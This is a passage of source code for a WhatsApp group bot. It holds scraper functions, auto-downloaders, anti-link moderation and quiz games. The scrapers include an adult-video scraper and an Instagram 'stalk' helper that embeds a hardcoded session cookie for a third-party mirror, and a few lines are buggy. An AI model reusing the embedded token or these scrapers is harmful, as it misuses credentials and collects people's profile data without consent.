            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
hasil.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
            })
            resolve(hasil)
        })
    })
}	

async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    reply(`This feature is for premium users, contact the owner to become a premium user`)
}
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await LordVoltage.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await LordVoltage.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
//=========================================\\
// Auto download tiktok
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
reply(mess.wait)
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(budy)}`)
  const vidnya = data.video.noWatermark
  const caption = `*𓊈 🌟 TIKTOK DOWNLOADER 🌟𓊉*

*Video from* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*ʟɪᴋᴇs*: _${data.stats.likeCount ?? ''}_
*ᴄᴏᴍᴍᴇɴᴛs*: _${data.stats.commentCount ?? ''}_
*sʜᴀʀᴇs*: _${data.stats.shareCount ?? ''}_
*ᴘʟᴀʏs*: _${data.stats.playCount ?? ''}_
*sᴀᴠᴇs*: _${data.stats.saveCount ?? ''}_

\`⏤͟͟͞͞ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ʙʏ ${botname}\`
> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`;
  LordVoltage.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`)
  const videoUrl = response.result.video;
  const captionn = `*𓊈 🌟 TIKTOK DOWNLOADER 🌟𓊉*

ʟɪᴋᴇs: ${response.result.statistics.likeCount ?? ''}
ᴄᴏᴍᴍᴇɴᴛs: ${response.result.statistics.commentCount ?? ''}
sʜᴀʀᴇs: ${response.result.statistics.shareCount ?? ''}
ʙʏ ${response.result.author.nickname ?? ''}

\`⏤͟͟͞͞ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ʙʏ ${botname}\`
> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`;
  LordVoltage.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}
  }
//=========================================\\
//Auto Download Video Instagram

//=========================================\\
//Auto Download Video Facebook
if(budy.includes('https://www.facebook.com/')){
const fg = require('api-dylux')
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replynano('Url invalid')
  }
  try {
    const result = await fg.fbdl(budy);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    LordVoltage.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replynano('Maybe private video!')
  }

}
//=========================================\\
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
LordVoltage.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
LordVoltage.sendMessage(m.chat, {
  image: await getBuffer(get_data_respon.image_url),
  caption: get_data_respon.response,
}, {
  quoted: m
})
}
}
//=========================================\\
        // Grup Only
        if (!m.isGroup && !DanzTheCreator && db.settings[botNumber].onlygrub ) {
        	if (isCmd){
            return  
            }
        }
        // Private Only
        if (!DanzTheCreator && db.settings[botNumber].onlypc && m.isGroup) {
        	if (isCmd){
	         return;
	     }
	}
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return reply('Make My Owner Admin To Use Command')
        let gclink = (`https://chat.whatsapp.com/`+await LordVoltage.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return LordVoltage.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n You will not be kicked by bots because what you sent was a link to this group`})
        if (isAdmins) return LordVoltage.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Admin sends a link, admin is free to post any link`})
        if (DanzTheCreator) return LordVoltage.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n owner has sent a link, owner is free to post any link`})
        kice = m.sender
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
			LordVoltage.sendMessage(from, {text:`\`\`\`「 Tautan Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan SUCCEED dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }            
        }

 // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
kice = m.sender
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} have sent the link and it was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
kice = m.sender
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} have sent the link and it was successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin sends a telegram link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Have been kicked for sending a telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin sends TikTok link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Have been kicked for posting tiktok links in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a Twitter link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Have been kicked for posting a twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

LordVoltage.family100 = LordVoltage.family100 ? LordVoltage.family100 : {};
if (from in LordVoltage.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.users[m.sender];
    let room = LordVoltage.family100[id];
   let text = typeof budy === 'string' ? budy.toLowerCase().replace(/[^\w\s\-]+/g, '') : '';
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);

    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);

        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return replynano('Dikit lagi!');
            }
        }

        if (!isCmd && room.terjawab[index]) {
            return;
        }

        users.money += room.winScore;
        room.terjawab[index] = m.sender;
    }

    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;

    let caption = `*GAME FAMILY100*

*Question:* ${room.soal}

There is ${room.jawaban.length} answer${room.jawaban.find(v => v.includes(' ')) ? `
(some answers contain spaces)
`: ''}
${isWin ? `*ALL ANSWERS ANSWERED 🙂*` : isSurrender ? '*GIVE UP ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money for every correct answer`}
    `.trim();

    LordVoltage.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        LordVoltage.family100[id].msg = msg;
    }).catch(_ => _);

    if (isWin || isSurrender) {
        delete LordVoltage.family100[id];
    }
}
LordVoltage.tebaklagu = LordVoltage.tebaklagu ? LordVoltage.tebaklagu : {};
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   LordVoltage.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/06g8rb.jpg' }, caption: `🎮 Guess the Song 🎮\n\nCorrect Answer 🎉\n\nWant to play again? Please type Guess the song`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else console.log('*Wrong Answer!*')
}

LordVoltage.tebakkata = LordVoltage.tebakkata ? LordVoltage.tebakkata : {}  
if (from in LordVoltage.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(LordVoltage.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Guess the Word 🎮\n\nCorrect Answer 🎉\nPrize : 10.000 money\n`
 replynano(`${teks}`)
 clearTimeout(LordVoltage.tebakkata[id][2])
 delete LordVoltage.tebakkata[id]
} else console.log('*Wrong Answer!*')
}
LordVoltage.tebakgambar = LordVoltage.tebakgambar ? LordVoltage.tebakgambar : {} 
if(from in LordVoltage.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(LordVoltage.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Guess the Picture 🎮\n\nCorrect Answer 🎉\nPrize: 10,000 money\n\nWant to play again? Please type Guess the Image`
 replynano(`${teks}`)
 clearTimeout(LordVoltage.tebakgambar[id][3])
 delete LordVoltage.tebakgambar[id]
} else console.log('*Wrong Answer!*')
}
LordVoltage.tebakbendera2 = LordVoltage.tebakbendera2 ? LordVoltage.tebakbendera2 : {};
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*You have given up*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await LordVoltage.sendText(m.chat, `🎮 Guess the Flag 🎮\n\Correct Answer 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
LordVoltage.tebakbendera = LordVoltage.tebakbendera ? LordVoltage.tebakbendera : {};
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*You have given up*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await LordVoltage.sendText(m.chat, `🎮 Guess the Picture 🎮\n\nCorrect Answer 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
LordVoltage.tebakkabupaten = LordVoltage.tebakkabupaten ? LordVoltage.tebakkabupaten : {};
 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*You have given up*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await LordVoltage.sendText(m.chat, `🎮 Guess the District 🎮\n\nCorrect Answer 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
 LordVoltage.tebakkimia = LordVoltage.tebakkimia ? LordVoltage.tebakkimia : {};
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*You have given up*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await LordVoltage.sendText(m.chat, `🎮 Guess Chemistry 🎮\n\nCorrect Answer 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
        
//=========================================\\
LordVoltage.tekateki = LordVoltage.tekateki ? LordVoltage.tekateki : {}  
if(from in LordVoltage.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(LordVoltage.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += LordVoltage.tekateki[id][2]
 var teks = `*PUZZLE GAME*\n\nYour Answer is Correct!\n Prizes : +${LordVoltage.tekateki[id][2]} Money 💸`
 replynano(`${teks}`)
 clearTimeout(LordVoltage.tekateki[id][3])
 delete LordVoltage.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*Dikit Lagi!*`)
}
//=========================================\\
LordVoltage.tebakasahotak = LordVoltage.tebakasahotak ? LordVoltage.tebakasahotak : {};
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replynano('*You have given up*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await LordVoltage.sendText(m.chat, `🎮 Brain Teaser 🎮\n\nCorrect Answer 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else console.log('*Wrong Answer!*')
        }
//=========================================\\
        LordVoltage.siapaaku = LordVoltage.siapaaku ? LordVoltage.siapaaku : {}
if(from in LordVoltage.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(LordVoltage.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += LordVoltage.siapaaku[id][2]
var teks = `*GAME WHO AM I*\n\nYour Answer is Correct!\n Prize : +${LordVoltage.siapaaku[id][2]} Money 💸`
   replynano(`${teks}`)
 clearTimeout(LordVoltage.siapaaku[id][3])
 delete LordVoltage.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*A Little More!*`)
// else reply(`*Salah!*`) 
}
//=========================================\\
        LordVoltage.susunkata = LordVoltage.susunkata ? LordVoltage.susunkata : {}  
if(from in LordVoltage.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(LordVoltage.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += LordVoltage.susunkata[id][2]
   var teks = `*WORD COMPOSITION GAMES*\n\nYour Answer is Correct!\n Prizes : +${LordVoltage.susunkata[id][2]} Money 💸`
replynano(`${teks}`)
 clearTimeout(LordVoltage.susunkata[id][3])
 delete LordVoltage.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*A Little More!*`)
// else reply(`*Salah!*`)
 
}
//=========================================\\
LordVoltage.caklontong = LordVoltage.caklontong ? LordVoltage.caklontong : {};
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 LordVoltage.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/06g8rb.jpg' }, caption: `🎮 Guess Lontong 🎮\n\nCorrect Answer 🎉\n\nWant to play again? Please type Guess Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Wrong Answer!*')
}
LordVoltage.tebakkalimat = LordVoltage.tebakkalimat ? LordVoltage.tebakkalimat : {};
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 LordVoltage.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/06g8rb.jpg' }, caption: `🎮 Guess the Sentence 🎮\n\nCorrect Answer 🎉\n\nWant to play again? Please type Guess the sentence`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else console.log('*Wrong Answer!*')
}

//=========================================//
LordVoltage.tebaklirik = LordVoltage.tebaklirik ? LordVoltage.tebaklirik : {}  
if(from in LordVoltage.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(LordVoltage.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.money += LordVoltage.tebaklirik[id][2]
 global.db.users[m.sender].exp += 10
   var teks = `*LYRIC GUESSING GAME*\n\nYour Answer is Correct!\n Prizes : +${LordVoltage.tebaklirik[id][2]} Money 💸\n EXP: +10`
  replynano(`${teks}`)
 clearTimeout(LordVoltage.tebaklirik[id][3])
 delete LordVoltage.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replynano(`*A Little More!*`)
// else reply(`*Salah!*`)
 }
//=========================================\\
LordVoltage.tebaktebakan = LordVoltage.tebaktebakan ? LordVoltage.tebaktebakan : {};
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 LordVoltage.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/06g8rb.jpg' }, caption: `🎮 Guess Guess 🎮\n\nCorrect Answer 🎉\n\nWant to play again? Please type Guess`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Wrong Answer!*')
}
//antilink all by Dansya
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins && !isAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\n Sent By admin..🤝`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (DanzTheCreator) return reply(bvl)
        await LordVoltage.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
LordVoltage.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Sending of Links Is Prohibited Here...Warning Do Not Attempt Again `, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
